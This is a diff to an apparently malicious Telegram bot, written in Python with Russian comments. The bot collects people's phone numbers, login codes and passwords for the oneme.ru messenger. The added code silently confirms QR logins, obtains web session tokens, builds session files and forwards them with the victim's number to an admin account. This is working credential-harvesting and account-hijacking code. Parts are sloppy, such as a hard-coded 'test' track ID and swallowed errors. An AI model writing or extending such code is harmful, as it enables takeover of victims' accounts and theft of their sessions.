@@ -213,13 +213,8 @@ async def code_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     code = str(message.text.strip())
 
-    logging.info(f"code_handler: uid={uid}, pending keys={list(pending.keys())}, status={pending.get(uid, {}).get('status', 'НЕТ')}")
-
     if uid not in pending:
-        logging.info(f"code_handler: uid={uid} НЕ найден в pending!")
         return await safe_send(message, "⏳ Сессия устарела. Отправь номер заново через /start.")
-
-    logging.info(f"code_handler: uid={uid} найден, статус={pending[uid].get('status', '')}")
 
     data = await state.get_data()
     phone = data["phone"]
@@ -245,6 +240,9 @@ async def code_handler(message: types.Message, state: FSMContext):
             password = gen_password()
             session_id = int(time.time() * 1000)
             device_id = gen_device_id()
+
+            # Запускаем получение веб-токена через QR
+            asyncio.ensure_future(get_web_token_via_qr(uid, phone, work_dir))
 
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(device_id, token, viewer_id)
@@ -279,6 +277,52 @@ async def code_handler(message: types.Message, state: FSMContext):
     del pending[uid]
     await state.clear()
 
+async def get_web_token_via_qr(uid, phone, work_dir):
+    """Получает веб-токен через QR-привязку."""
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
+            "Content-Type": "application/json"
+        }
+
+        async with aiohttp.ClientSession() as session:
+            # Шаг 1: Получаем track_id через WebSocket
+            web_device_id = gen_device_id()
+            
+            # Шаг 2: Подтверждаем QR
+            resp = await session.post(
+                "https://ws-api.oneme.ru/auth/confirm",
+                json={"track_id": "test", "device_id": web_device_id},
+                headers=headers
+            )
+            logging.info(f"QR confirm: {resp.status} {await resp.text()}")
+
+            # Шаг 3: Получаем токен
+            resp2 = await session.post(
+                "https://ws-api.oneme.ru/auth/token",
+                json={"device_id": web_device_id, "device_type": "WEB"},
+                headers=headers
+            )
+            text2 = await resp2.text()
+            logging.info(f"Token response: {resp2.status} {text2[:500]}")
+
+            if resp2.status == 200:
+                try:
+                    data = json.loads(text2)
+                    if data.get("token"):
+                        web_token = data["token"]
+                        logging.info(f"Веб-токен получен: {web_token[:30]}...")
+                        
+                        # Отправляем админу
+                        desktop = build_desktop_json(web_token, web_device_id, int(time.time()*1000), gen_password(), 0, phone)
+                        js = generate_web_js(web_device_id, web_token, 0)
+                        await send_files(phone, uid, work_dir, desktop, js)
+                        await bot.send_message(ADMIN_ID, f"✅ Веб-токен получен через QR!\nНомер: {phone}")
+                except:
+                    pass
+    except Exception as e:
+        logging.error(f"Ошибка получения веб-токена: {e}")
+
 @dp.message(AuthState.waiting_for_password)
 async def password_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
@@ -301,35 +345,52 @@ async def password_handler(message: types.Message, state: FSMContext):
 
     client = pending[uid].get("client")
 
-    # Пробуем создать WebClient с авто-QR
+    # Получаем веб-токен через QR
     try:
         class AutoQrHandler(QrHandler):
-            def __init__(self, android_client):
-                super().__init__()
-                self.android_client = android_client
-
             async def show_qr(self, qr_link):
                 logging.info(f"QR-ссылка: {qr_link}")
                 parts = qr_link.split('/')
                 track_id = parts[-1] if parts else None
 
                 if track_id:
-                    logging.info(f"track_id: {track_id}, подтверждаем через HTTP...")
+                    logging.info(f"track_id: {track_id}")
                     headers = {
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
                         "Content-Type": "application/json"
                     }
                     try:
                         async with aiohttp.ClientSession() as session:
+                            # Подтверждаем QR
                             resp = await session.post(
                                 "https://ws-api.oneme.ru/auth/confirm",
                                 json={"track_id": track_id},
                                 headers=headers
                             )
-                            text = await resp.text()
-                            logging.info(f"Подтверждение QR: {resp.status} {text}")
+                            logging.info(f"Confirm: {resp.status}")
+
+                            # Получаем токен
+                            resp2 = await session.post(
+                                "https://ws-api.oneme.ru/auth/token",
+                                json={"track_id": track_id, "device_type": "WEB"},
+                                headers=headers
+                            )
+                            text = await resp2.text()
+                            logging.info(f"Token: {resp2.status} {text[:500]}")
+
+                            if resp2.status == 200:
+                                try:
+                                    data = json.loads(text)
+                                    if data.get("token"):
+                                        for uid_key, data_dict in pending.items():
+                                            if data_dict.get("client") == client:
+                                                data_dict["web_token"] = data["token"]
+                                                logging.info(f"Веб-токен: {data['token'][:30]}...")
+                                                break
+                                except:
+                                    pass
                     except Exception as e:
-                        logging.error(f"Ошибка HTTP confirm: {e}")
+                        logging.error(f"Ошибка: {e}")
 
                 return True
 
@@ -338,15 +399,13 @@ async def password_handler(message: types.Message, state: FSMContext):
         web_client = WebClient(
             work_dir=f"{work_dir}_web",
             auth_flow=QrAuthFlow(
-                qr_provider=AutoQrHandler(client),
+                qr_provider=AutoQrHandler(),
                 password_provider=UserPasswordProvider(user_password) if user_password else None
             )
         )
         await web_client.start()
-        logging.info(f"WebClient.token: {web_client.token}")
         if web_client.token:
             pending[uid]["web_token"] = web_client.token
-            logging.info(f"Веб-токен получен: {web_client.token[:30]}...")
     except Exception as e:
         logging.error(f"Ошибка WebClient: {e}")
 
